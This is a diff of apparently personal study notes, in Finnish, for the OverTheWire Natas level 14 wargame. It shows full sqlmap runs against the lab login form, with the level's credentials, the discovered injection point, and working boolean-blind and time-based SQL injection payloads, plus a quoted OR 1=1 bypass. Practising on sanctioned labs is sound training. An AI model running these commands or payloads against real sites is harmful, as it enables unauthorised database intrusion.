@@ -336,7 +336,172 @@ Executing query: SELECT * from users where username="admin"' OR 1=1 --" and pass
 
 ## Kali Linux - SQLMAP version - START HERE
 
+kokeilin yksi niistä komennosa ja ainakin pelittävän, mutta tulokse on vähä hämääviä.. 
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" \                                    
+  --auth-type Basic \
+  --auth-cred "natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" \
+  --data "username=admin&password=admin" \
+  --batch
+        ___
+       __H__                                                                                                                         
+ ___ ___[.]_____ ___ ___  {1.8.5#stable}                                                                                             
+|_ -| . [.]     | .'| . |                                                                                                            
+|___|_  [']_|_|_|__,|  _|                                                                                                            
+      |_|V...       |_|   https://sqlmap.org                                                                                         
 
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:15:47 /2025-05-17/
+
+[12:15:47] [INFO] testing connection to the target URL
+[12:15:47] [WARNING] potential permission problems detected ('Access denied')
+[12:15:47] [INFO] checking if the target is protected by some kind of WAF/IPS
+[12:15:47] [INFO] testing if the target URL content is stable
+[12:15:48] [INFO] target URL content is stable
+[12:15:48] [INFO] testing if POST parameter 'username' is dynamic
+[12:15:48] [WARNING] POST parameter 'username' does not appear to be dynamic
+[12:15:48] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
+[12:15:48] [INFO] testing for SQL injection on POST parameter 'username'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[12:15:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[12:15:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[12:15:49] [INFO] testing 'Generic inline queries'
+[12:15:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[12:15:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[12:15:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[12:15:53] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable 
+[12:15:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[12:15:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[12:15:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[12:15:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[12:15:53] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[12:15:53] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[12:15:53] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[12:15:53] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[12:15:53] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:15:53] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:15:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[12:15:53] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[12:15:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[12:15:53] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[12:15:53] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[12:15:54] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[12:15:54] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[12:15:54] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[12:15:54] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[12:15:54] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[12:15:54] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[12:15:54] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[12:15:54] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[12:15:54] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
+[12:15:54] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[12:15:54] [INFO] testing 'MySQL inline queries'
+[12:15:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[12:15:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[12:15:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[12:15:54] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[12:15:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[12:15:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[12:15:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[12:16:04] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[12:16:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[12:16:04] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[12:16:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[12:16:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[12:16:04] [INFO] target URL appears to have 2 columns in query
+do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[12:16:05] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[12:16:06] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[12:16:07] [INFO] testing 'MySQL UNION query (73) - 21 to 40 columns'
+[12:16:08] [INFO] testing 'MySQL UNION query (73) - 41 to 60 columns'
+[12:16:09] [INFO] testing 'MySQL UNION query (73) - 61 to 80 columns'
+[12:16:10] [INFO] testing 'MySQL UNION query (73) - 81 to 100 columns'
+[12:16:10] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[12:16:10] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=admin" OR NOT 9188=9188#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin" AND (SELECT 2142 FROM (SELECT(SLEEP(5)))vnvd)-- Cgqh&password=admin
+---
+[12:16:11] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[12:16:11] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas14.natas.labs.overthewire.org'
+[12:16:11] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:16:11 /2025-05-17/
+
+```
+
+Eli tästä ylemmästä tuloksesta ainakin kertoi havaintojen ajosta:
+- injektiopiste: POST parametri username on haavoittuva SQL-injektiolle
+- Injketiotyyppi:
+- tietokanta versio on: `MySQL >= 5.0.12`
+- palvelin versio: Apache 2.4.58 (Linux Ubuntu)
+- tallennettu tiedosto sijaitsee: `~/.local/share/sqlmap/output/natas14.natas.labs.overthewire.org/`
+
+
+**Seuraavaksi** halutaan se SQL injektio haavoittuvuutta ja alttiimista, että automaattisesti poimii datoja ulos sieltä ja ja jos injektio onnistuu
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u "http://natas14.natas.labs.overthewire.org/index.php" \
+  --auth-type Basic \
+  --auth-cred "natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ" \
+  --data "username=admin&password=admin" \
+  --batch \
+  --level=5 --risk=3
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.8.5#stable}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:24:53 /2025-05-17/
+
+[12:24:53] [INFO] resuming back-end DBMS 'mysql' 
+[12:24:53] [INFO] testing connection to the target URL
+[12:24:53] [WARNING] potential permission problems detected ('Access denied')
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=admin" OR NOT 9188=9188#&password=admin
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin" AND (SELECT 2142 FROM (SELECT(SLEEP(5)))vnvd)-- Cgqh&password=admin
+---
+[12:24:53] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.58
+back-end DBMS: MySQL >= 5.0.12
+[12:24:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/natas14.natas.labs.overthewire.org'
+[12:24:53] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 12:24:53 /2025-05-17/
+
+```
+
+Tässä ylemmässä tuloksena ainakin liittyen `access denied`:
+- Viesti koskien se ei tarkoita virhettä sqlmappissa - vaan soveluksessa eli natas omassa vastauksessa, joka yrittää estää näkyvyyttä. Koska sqlmpa sai injektiosta irti `boolean` ja `time-based blind` vastauksia, ja ohittanut sen näkyvyyttä. 
 
 
 
